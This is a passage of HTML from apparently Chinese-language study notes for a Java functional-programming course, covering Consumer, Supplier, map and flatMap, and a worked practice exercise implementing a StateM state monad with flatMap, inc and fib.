250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z\"/></g><g data-mml-node=\"mn\" transform=\"translate(8470.1,0)\"><path data-c=\"33\" d=\"M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(9192.3,0)\"><path data-c=\"2B\" d=\"M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z\"/></g><g data-mml-node=\"mn\" transform=\"translate(10192.6,0)\"><path data-c=\"31\" d=\"M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(10692.6,0)\"><path data-c=\"29\" d=\"M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(11359.3,0)\"><path data-c=\"3D\" d=\"M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(12415.1,0)\"><path data-c=\"1D454\" d=\"M311 43Q296 30 267 15T206 0Q143 0 105 45T66 160Q66 265 143 353T314 442Q361 442 401 394L404 398Q406 401 409 404T418 412T431 419T447 422Q461 422 470 413T480 394Q480 379 423 152T363 -80Q345 -134 286 -169T151 -205Q10 -205 10 -137Q10 -111 28 -91T74 -71Q89 -71 102 -80T116 -111Q116 -121 114 -130T107 -144T99 -154T92 -162L90 -164H91Q101 -167 151 -167Q189 -167 211 -155Q234 -144 254 -122T282 -75Q288 -56 298 -13Q311 35 311 43ZM384 328L380 339Q377 350 375 354T369 368T359 382T346 393T328 402T306 405Q262 405 221 352Q191 313 171 233T151 117Q151 38 213 38Q269 38 323 108L331 118L384 328Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(12892.1,0)\"><path data-c=\"28\" d=\"M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z\"/></g><g data-mml-node=\"mn\" transform=\"translate(13281.1,0)\"><path data-c=\"34\" d=\"M462 0Q444 3 333 3Q217 3 199 0H190V46H221Q241 46 248 46T265 48T279 53T286 61Q287 63 287 115V165H28V211L179 442Q332 674 334 675Q336 677 355 677H373L379 671V211H471V165H379V114Q379 73 379 66T385 54Q393 47 442 46H471V0H462ZM293 211V545L74 212L183 211H293Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(13781.1,0)\"><path data-c=\"29\" d=\"M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(14447.9,0)\"><path data-c=\"3D\" d=\"M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z\"/></g><g data-mml-node=\"mn\" transform=\"translate(15503.7,0)\"><path data-c=\"34\" d=\"M462 0Q444 3 333 3Q217 3 199 0H190V46H221Q241 46 248 46T265 48T279 53T286 61Q287 63 287 115V165H28V211L179 442Q332 674 334 675Q336 677 355 677H373L379 671V211H471V165H379V114Q379 73 379 66T385 54Q393 47 442 46H471V0H462ZM293 211V545L74 212L183 211H293Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(16225.9,0)\"><path data-c=\"D7\" d=\"M630 29Q630 9 609 9Q604 9 587 25T493 118L389 222L284 117Q178 13 175 11Q171 9 168 9Q160 9 154 15T147 29Q147 36 161 51T255 146L359 250L255 354Q174 435 161 449T147 471Q147 480 153 485T168 490Q173 490 175 489Q178 487 284 383L389 278L493 382Q570 459 587 475T609 491Q630 491 630 471Q630 464 620 453T522 355L418 250L522 145Q606 61 618 48T630 29Z\"/></g><g data-mml-node=\"mn\" transform=\"translate(17226.1,0)\"><path data-c=\"32\" d=\"M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(18003.9,0)\"><path data-c=\"3D\" d=\"M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z\"/></g><g data-mml-node=\"mn\" transform=\"translate(19059.7,0)\"><path data-c=\"38\" d=\"M70 417T70 494T124 618T248 666Q319 666 374 624T429 515Q429 485 418 459T392 417T361 389T335 371T324 363L338 354Q352 344 366 334T382 323Q457 264 457 174Q457 95 399 37T249 -22Q159 -22 101 29T43 155Q43 263 172 335L154 348Q133 361 127 368Q70 417 70 494ZM286 386L292 390Q298 394 301 396T311 403T323 413T334 425T345 438T355 454T364 471T369 491T371 513Q371 556 342 586T275 624Q268 625 242 625Q201 625 165 599T128 534Q128 511 141 492T167 463T217 431Q224 426 228 424L286 386ZM250 21Q308 21 350 55T392 137Q392 154 387 169T375 194T353 216T330 234T301 253T274 270Q260 279 244 289T218 306L210 311Q204 311 181 294T133 239T107 157Q107 98 150 60T250 21Z\"/></g></g></g></svg></mjx-container></span></p>\n<h3 id=\"comsumer-和-supplier\">1.4 Comsumer 和 Supplier</h3>\n<p>这两个接口是 Function 的子集。分别没有返回值和输入参数。</p>\n<h4 id=\"comsumer\">Comsumer</h4>\n<p>Comsumer&lt;输入参数类型&gt;</p>\n<p>只有一个接口：accept</p>\n<p>定义：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Consumer&lt;String&gt; printer = s -&gt; System.out.println(\"Output: \" + s);</span><br></pre></td></tr></table></figure>\n<p>调用：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">jshell&gt; printer.accept(<span class=\"string\">\"Hello\"</span>)</span><br><span class=\"line\">Output: Hello</span><br></pre></td></tr></table></figure>\n<h4 id=\"supplier\">Supplier</h4>\n<p>Supplier&lt;返回值类型&gt;</p>\n<p>只有一个接口：get</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Supplier&lt;Double&gt; randomSupplier = () -&gt; Math.random();</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">jshell&gt; randomSupplier.get()</span><br><span class=\"line\">$.. ==&gt; 0.7238678136192443</span><br></pre></td></tr></table></figure>\n<h2 id=\"map-与-flatmap\">2 map 与 flatMap</h2>\n<p>考点中经常会要手动实现 <code>map</code> 和 <code>flatMap</code>\n这两个函数。先理解他们的作用。</p>\n<p><code>map</code> 和 <code>flatMap</code> 都是\n<code>Stream&lt;T&gt;</code> 接口的成员。</p>\n<p>通常，一个类如果可以被遍历，就是实现了 <code>Stream&lt;T&gt;</code>\n接口。</p>\n<ul>\n<li><p><strong>map</strong></p>\n<ul>\n<li><p>输入参数：<code>Function&lt;T, R&gt;</code>\n表示一个映射关系</p></li>\n<li><p>作用：将流中的每一个元素，从类型 T 转换为类型 R。</p></li>\n</ul></li>\n<li><p><strong>flatMap</strong></p>\n<ul>\n<li>输入参数：<code>Function&lt;T, Stream&lt;R&gt;&gt;</code></li>\n<li>返回值：Stream&lt;R&gt;。<strong><code>flatMap</code>\n的返回值，和调用他对象的类型必须一样</strong></li>\n<li>作用：通常用于处理<strong>嵌套</strong>的列表，将列表中的每一项<strong>展开</strong>，返回一个解除嵌套的列表。</li>\n</ul></li>\n</ul>\n<p>举例：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">jshell&gt; Stream.of(1, 2, 3, 4, 5).map(x -&gt; x + 1).toList();</span><br><span class=\"line\"><span class=\"variable\">$129</span> ==&gt; [2, 3, 4, 5, 6]</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">jshell&gt; Stream.of(</span><br><span class=\"line\">   ...&gt; \tStream.of(1, 2, 3),</span><br><span class=\"line\">   ...&gt;\t\tStream.of(4, 5, 6), </span><br><span class=\"line\">   ...&gt; \tStream.of(7, 8)</span><br><span class=\"line\">   ...&gt; ).flatMap(stream -&gt; stream).toList() <span class=\"comment\"># 其中的stream是每一个子Stream</span></span><br><span class=\"line\"><span class=\"variable\">$133</span> ==&gt; [1, 2, 3, 4, 5, 6, 7, 8]</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">jshell&gt; Stream.of(</span><br><span class=\"line\">   ...&gt; Stream.of(1, 2, 3),Stream.of(4, 5, 6), Stream.of(7, 8)</span><br><span class=\"line\">   ...&gt; ).flatMap(stream -&gt; stream.map(x-&gt;x+1)).toList() <span class=\"comment\"># 对每一个子类先进行+1的操作，再合并</span></span><br><span class=\"line\"><span class=\"variable\">$134</span> ==&gt; [2, 3, 4, 5, 6, 7, 8, 9]</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">jshell&gt; Stream.of(</span><br><span class=\"line\">   ...&gt; Stream.of(1, 2, 3),Stream.of(4, 5, 6), Stream.of(7, 8)</span><br><span class=\"line\">   ...&gt; ).flatMap(x -&gt; x).map(x-&gt;x+1).toList()\t <span class=\"comment\"># 先合并，再+1</span></span><br><span class=\"line\"><span class=\"variable\">$135</span> ==&gt; [2, 3, 4, 5, 6, 7, 8, 9]</span><br></pre></td></tr></table></figure>\n<p>但是，在作业中，<code>flatMap</code>\n通常不用做<strong>展开</strong>，而是用于把某个类的操作<strong>串联</strong>起来。</p>\n<p>题目中并不喜欢让你写应用在数组上的 <code>map</code> 和\n<code>flatMap</code> ，而是仿照 <code>Optional</code>\n，应用在一个类上，是用来提取类中包裹的数据的。</p>\n<h2 id=\"泛型-generic\">3 泛型 generic</h2>\n<p>考试中，不需要写复杂的 &lt;? extend XXX&gt;\n类似的内容，所以单从语法上出发，泛型的考点很少。</p>\n<p>重点见 <a href=\"#%20成员函数泛型\">附录-成员函数泛型</a></p>\n<h1 id=\"练习-ay2324-semester-2-statem\">练习 <span class=\"exturl\" data-url=\"aHR0cHM6Ly9ydXNzZWxsZGFzaDMzMi5naXRodWIuaW8vQ1MyMDMwL1BBL1BBMi8yMzIwL1BBMl8yMzIwLmh0bWw=\">AY23/24\nSemester 2: StateM<i class=\"fa fa-external-link-alt\"></i></span></h1>\n<p>https://russelldash332.github.io/CS2030/PA/PA2/2320/PA2_2320.html</p>\n<h2 id=\"level-1\">Level 1</h2>\n<p>要求：实现两个函数，<code>unit</code> 和 <code>toString</code>\n，<strong>不允许添加任何成员变量</strong>。</p>\n<p><img src=\"/CS2030/2024-11-02-%E6%96%B0%E5%8A%A0%E5%9D%A1%E5%9B%BD%E7%AB%8B-CS2030-%E7%9F%A5%E8%AF%86%E7%82%B9%E6%95%B4%E7%90%86/202411021336879.png\" alt=\"image-20241102133529986\" style=\"zoom:50%;\"></p>\n<p>分析源码，只有一个成员变量，是一个纯函数。所以是那种\n<code>lazy</code>\n延迟计算的思路，把需要初始化的变量添加成函数的返回值。</p>\n<p><code>unit</code> 是一个静态工厂方法，输入参数 T，返回 StateM\n的实例。输入参数包裹在他的成员变量纯函数f里。</p>\n<p>toString 直接返回 <code>StateM</code> 。</p>\n<figure>\n<img src=\"/CS2030/2024-11-02-%E6%96%B0%E5%8A%A0%E5%9D%A1%E5%9B%BD%E7%AB%8B-CS2030-%E7%9F%A5%E8%AF%86%E7%82%B9%E6%95%B4%E7%90%86/202411021343887.png\" alt=\"image-20241102134330517\">\n<figcaption aria-hidden=\"true\">image-20241102134330517</figcaption>\n</figure>\n<p>现在问题就是，纯函数 <code>f</code>\n长什么样？换言之，怎么<strong>构造</strong>、怎么<strong>调用</strong></p>\n<p>构造：</p>\n<ul>\n<li>输入类型：S</li>\n<li>返回类型：Pair&lt;T, S&gt;</li>\n<li>函数关系（表达式）：传进去的参数 f\n<ul>\n<li>unit里提供的参数，是返回值的 T，accept 提供的参数，是返回值的 S</li>\n</ul></li>\n</ul>\n<p>调用：</p>\n<ul>\n<li>accept方法，直接调用成员变量参数 f 。</li>\n</ul>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> java.util.function.Function;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// extends 继承，父类和子类，抽象类也是类，用继承</span></span><br><span class=\"line\"><span class=\"comment\">// implements 实现，接口和类，接口用实现</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">StateM</span>&lt;T, S&gt; <span class=\"keyword\">extends</span> <span class=\"title class_\">AbstractStateM</span>&lt;T, S&gt; {    </span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"title function_\">StateM</span><span class=\"params\">(T t)</span> {</span><br><span class=\"line\">        <span class=\"built_in\">super</span>(t);</span><br><span class=\"line\">    }</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\">// 错误，没有泛型参数</span></span><br><span class=\"line\">    <span class=\"comment\">// public static StateM&lt;T, S&gt; unit(T t) {</span></span><br><span class=\"line\">    <span class=\"comment\">//     return new StateM&lt;T, S&gt;(t);</span></span><br><span class=\"line\">    <span class=\"comment\">// }</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\">// 静态方法的类型，需要在 static 后面声明 </span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> &lt;T, S&gt; StateM&lt;T, S&gt; <span class=\"title function_\">unit</span><span class=\"params\">(T t)</span> {</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> <span class=\"title class_\">StateM</span>&lt;T, S&gt;(t);</span><br><span class=\"line\">    }</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">public</span> String <span class=\"title function_\">toString</span><span class=\"params\">()</span> {</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">\"StateM\"</span>;</span><br><span class=\"line\">    }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure>\n<h2 id=\"level-2\">Level 2</h2>\n<p>新增两个方法，用于 state 的读和写：</p>\n<ul>\n<li><p>&lt;T&gt;get：</p>\n<ul>\n<li>作用：构造一个新的 StateM，其函数：\n<ul>\n<li>输入类型：T</li>\n<li>返回类型：Pair&lt;T, T&gt;</li>\n<li>x -&gt; Pair(x, x)</li>\n</ul></li>\n<li>输入参数：无</li>\n<li>返回类型：StateM</li>\n</ul>\n<p><img src=\"/CS2030/2024-11-02-%E6%96%B0%E5%8A%A0%E5%9D%A1%E5%9B%BD%E7%AB%8B-CS2030-%E7%9F%A5%E8%AF%86%E7%82%B9%E6%95%B4%E7%90%86/202411021416686.png\" alt=\"image-20241102141639202\" style=\"zoom:50%;\"></p></li>\n</ul>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">private</span> <span class=\"title function_\">StateM</span><span class=\"params\">(Function&lt;S,Pair&lt;T,S&gt;&gt; f)</span> {</span><br><span class=\"line\">    <span class=\"built_in\">super</span>(f);</span><br><span class=\"line\">}</span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> &lt;T&gt; StateM&lt;T, T&gt; <span class=\"title function_\">get</span><span class=\"params\">()</span> {</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> <span class=\"title class_\">StateM</span>&lt;T, T&gt;(x -&gt; <span class=\"keyword\">new</span> <span class=\"title class_\">Pair</span>&lt;T, T&gt;(x, x));</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure>\n<ul>\n<li><p>put</p>\n<p>示例：</p>\n<p><img src=\"/CS2030/2024-11-02-%E6%96%B0%E5%8A%A0%E5%9D%A1%E5%9B%BD%E7%AB%8B-CS2030-%E7%9F%A5%E8%AF%86%E7%82%B9%E6%95%B4%E7%90%86/image-20241102160127264.png\" alt=\"image-20241102160127264\" style=\"zoom: 33%;\"></p>\n<ul>\n<li>作用：构造一个新的 StateM，其函数：\n<ul>\n<li>输入类型：S</li>\n<li>输出类型：Pair(Nothing, S)</li>\n<li>x -&gt; Pair(Nothing, S)</li>\n</ul></li>\n</ul></li>\n</ul>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">public <span class=\"type\">static</span> &lt;S&gt; StateM&lt;Nothing, S&gt; <span class=\"title function_\">put</span><span class=\"params\">(S s)</span> {</span><br><span class=\"line\">    <span class=\"keyword\">return</span> new StateM&lt;Nothing, S&gt;(x -&gt; new Pair&lt;Nothing, S&gt;(Nothing.nothing(), s));</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">Nothing</span> {</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"title function_\">Nothing</span><span class=\"params\">()</span> {}</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> Nothing <span class=\"title function_\">nothing</span><span class=\"params\">()</span> {</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Nothing</span>();</span><br><span class=\"line\">    }</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">public</span> String <span class=\"title function_\">toString</span><span class=\"params\">()</span> {</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">\"-\"</span>;</span><br><span class=\"line\">    }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure>\n<h2 id=\"level-3\">Level 3</h2>\n<p>写一个 flatMap 函数。复习一下：<code>flatMap</code>\n的返回值，和调用他对象的类型必须一样。</p>\n<p>所以这里的 StateM 的 flatMap ，返回值一定是 StateM。</p>\n<figure>\n<img src=\"/CS2030/2024-11-02-%E6%96%B0%E5%8A%A0%E5%9D%A1%E5%9B%BD%E7%AB%8B-CS2030-%E7%9F%A5%E8%AF%86%E7%82%B9%E6%95%B4%E7%90%86/image-20241102150451624.png\" alt=\"image-20241102150451624\">\n<figcaption aria-hidden=\"true\">image-20241102150451624</figcaption>\n</figure>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">StateM.&lt;String, Integer&gt;unit(<span class=\"string\">\"init\"</span>);</span><br><span class=\"line\">(init, ) <span class=\"comment\">// 返回值是 unit 传进去的参数, 后面 accept 传进去的参数，所以只用管</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li>输入参数：Function\n<ul>\n<li>输入：原始的 StateM ，unit\n传进去的参数！（更准确的，返回值的first），后面我们叫他 value</li>\n<li>输出：新的 StateM</li>\n</ul></li>\n<li>返回值：新的 StateM （Function的输出！）</li>\n</ul>\n<p>这里有点绕，一步步来：</p>\n<p>根据分析的输入参数和返回值，写出函数的声明：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> &lt;U&gt; StateM&lt;U, S&gt; <span class=\"title function_\">flatMap</span><span class=\"params\">(Function&lt;T, StateM&lt;U, S&gt;&gt; mapper)</span> {</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure>\n<p>根据示例，很显然，<code>flatMap</code> 返回值就是 <code>mapper</code>\n的返回值，所以有：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> &lt;U&gt; StateM&lt;U, S&gt; <span class=\"title function_\">flatMap</span><span class=\"params\">(Function&lt;T, StateM&lt;U, S&gt;&gt; mapper)</span> {</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> mapper.apply(t);</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure>\n<p>但是这里没有 <code>t</code> 啊。t 就是当前 <code>StateM</code> 构造时\n<code>unit</code> 传进去的参数，被我们叫做 <code>value</code>\n的变量。我们可以通过 <code>this.accept(s)</code>\n来得到函数的返回值，所以有：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> &lt;U&gt; StateM&lt;U, S&gt; <span class=\"title function_\">flatMap</span><span class=\"params\">(Function&lt;T, StateM&lt;U, S&gt;&gt; mapper)</span> {</span><br><span class=\"line\">    <span class=\"type\">T</span> <span class=\"variable\">t</span> <span class=\"operator\">=</span> <span class=\"built_in\">this</span>.accept(s).first();</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> mapper.apply(t);</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure>\n<p>但是还是不知道 <code>s</code> 啊！<code>s</code> 是\n<code>accept</code> 的参数，用户调用 <code>accept</code> 的时候，才把\n<code>accept</code> 传进来，调用 this.f 。这不就是所说的 lazy\n延迟计算吗？所以这里的 s\n，应该是我自己定义的一个<code>Lambda</code>函数的参数：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> &lt;U&gt; StateM&lt;U, S&gt; <span class=\"title function_\">flatMap</span><span class=\"params\">(Function&lt;T, StateM&lt;U, S&gt;&gt; mapper)</span> {</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> <span class=\"title class_\">StateM</span>&lt;U, S&gt; (s -&gt; {</span><br><span class=\"line\">       <span class=\"type\">T</span> <span class=\"variable\">t</span> <span class=\"operator\">=</span> <span class=\"built_in\">this</span>.accept(s).first();</span><br><span class=\"line\">       StateM&lt;U, S&gt; state = mapper.apply(t);</span><br><span class=\"line\">       <span class=\"keyword\">return</span> state.accept(s);</span><br><span class=\"line\">    });</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure>\n<p>然后执行测试，运行到这一句发现不对了：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">StateM&lt;Integer, Integer&gt; <span class=\"title function_\">bar</span><span class=\"params\">(StateM&lt;String, Integer&gt; sm)</span> {</span><br><span class=\"line\">    <span class=\"keyword\">return</span> sm.flatMap(x -&gt; StateM.&lt;Integer&gt;get().flatMap(y -&gt; StateM.&lt;Integer&gt;put(y + <span class=\"number\">10</span>))</span><br><span class=\"line\">             .flatMap(z -&gt; StateM.&lt;Integer, Integer&gt;unit(x.length())));</span><br><span class=\"line\">}</span><br><span class=\"line\">bar(StateM.&lt;String, Integer&gt;unit(<span class=\"string\">\"init\"</span>)).accept(<span class=\"number\">1</span>)</span><br><span class=\"line\">    </span><br><span class=\"line\">(<span class=\"number\">4</span>, <span class=\"number\">11</span>)</span><br></pre></td></tr></table></figure>\n<p>我的结果是 <code>(4, 1)</code> ，显然是 <code>put(y + 10)</code>\n没被执行。</p>\n<p>因为 pair 的第二个值经过 <code>accept</code> 会被修改，而我在\n<code>flatMap</code> 里一直用的是最早的 s 。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> &lt;U&gt; StateM&lt;U, S&gt; <span class=\"title function_\">flatMap</span><span class=\"params\">(Function&lt;T, StateM&lt;U, S&gt;&gt; mapper)</span> {</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> <span class=\"title class_\">StateM</span>&lt;U, S&gt;(s -&gt; {</span><br><span class=\"line\">        Pair&lt;T, S&gt; pair = <span class=\"built_in\">this</span>.accept(s);</span><br><span class=\"line\">        StateM&lt;U, S&gt; state = mapper.apply(pair.first());</span><br><span class=\"line\">        Pair&lt;U, S&gt; newPair = state.accept(pair.second());</span><br><span class=\"line\">        <span class=\"keyword\">return</span> newPair;</span><br><span class=\"line\">    });</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure>\n<h2 id=\"level-4\">Level 4</h2>\n<p>创建 inc() ，但是不允许使用构造函数，因为是 <code>private</code>\n的。上面的 <code>bar</code> 其实提供了提示。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">StateM&lt;Nothing, Integer&gt; <span class=\"title function_\">inc</span><span class=\"params\">()</span> {</span><br><span class=\"line\">    <span class=\"keyword\">return</span> StateM.&lt;Integer&gt;get().flatMap(x -&gt; StateM.&lt;Integer&gt;put(x + <span class=\"number\">1</span>));</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">StateM&lt;Integer, Integer&gt; <span class=\"title function_\">fib</span><span class=\"params\">(<span class=\"type\">int</span> n)</span> {</span><br><span class=\"line\">    <span class=\"keyword\">return</span> inc().flatMap(ignore -&gt; {</span><br><span class=\"line\">       <span class=\"keyword\">if</span> (n &lt;= <span class=\"number\">1</span>) {</span><br><span class=\"line\">           <span class=\"keyword\">return</span> StateM.unit(n);</span><br><span class=\"line\">       } <span class=\"keyword\">else</span> {</span><br><span class=\"line\">           <span class=\"keyword\">return</span> fib(n - <span class=\"number\">1</span>).flatMap(x -&gt; fib(n - <span class=\"number\">2</span>).flatMap(y -&gt; StateM.unit(x + y)));</span><br><span class=\"line\">       }</span><br><span class=\"line\">    });</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure>\n<p>解释：考试时，捋不清楚，想不明白他的含义没事，也能做完 Level 3.</p>\n<ul>\n<li>Pair&lt;T, S&gt; 的 T ，是计算的结果，S是历史记录、状态</li>\n<li>get，用于返回历史记录，把现在的历史记录设置给 T。把 s 赋值给\nt。</li>\n<li>put，用于修改历史记录，把 T 设置为 Nothing 。</li>\n<li>flatMap，用于串联计算。inc().flatMap(ignore -&gt; inc());\n表示连续执行 inc，inc，两次。</li>\n</ul>\n<p>fib(n - 1).flatMap(x -&gt; fib(n - 2).flatMap(y -&gt; StateM.unit(x +\ny)));</p>\n<p>先执行 fib(n - 1) ，再执行 fib (n - 2) ，在执行 StateM.unit(x +\ny);</p>\n<h2 id=\"level-5\">Level 5</h2>\n<p>很难，很绕。考试时没时间就不写，很合理。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">FuncStat</span> {</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">final</span> Integer count;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">final</span> Integer depth;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">final</span> Integer maxDepth;</span><br><span class=\"line\">    </span><br><span class=\"line\">    FuncStat() {</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.count = <span class=\"number\">0</span>;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.depth = <span class=\"number\">0</span>;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.maxDepth = <span class=\"number\">0</span>;</span><br><span class=\"line\">    }</span><br><span class=\"line\">    </span><br><span class=\"line\">    FuncStat(<span class=\"type\">int</span> count, <span class=\"type\">int</span> depth, <span class=\"type\">int</span> maxDepth) {</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.count = count;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.depth = depth;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.maxDepth = Math.max(depth, maxDepth);</span><br><span class=\"line\">    }</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">public</span> FuncStat <span class=\"title function_\">incCount</span><span class=\"params\">()</span> {</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> <span class=\"title class_\">FuncStat</span>(count + <span 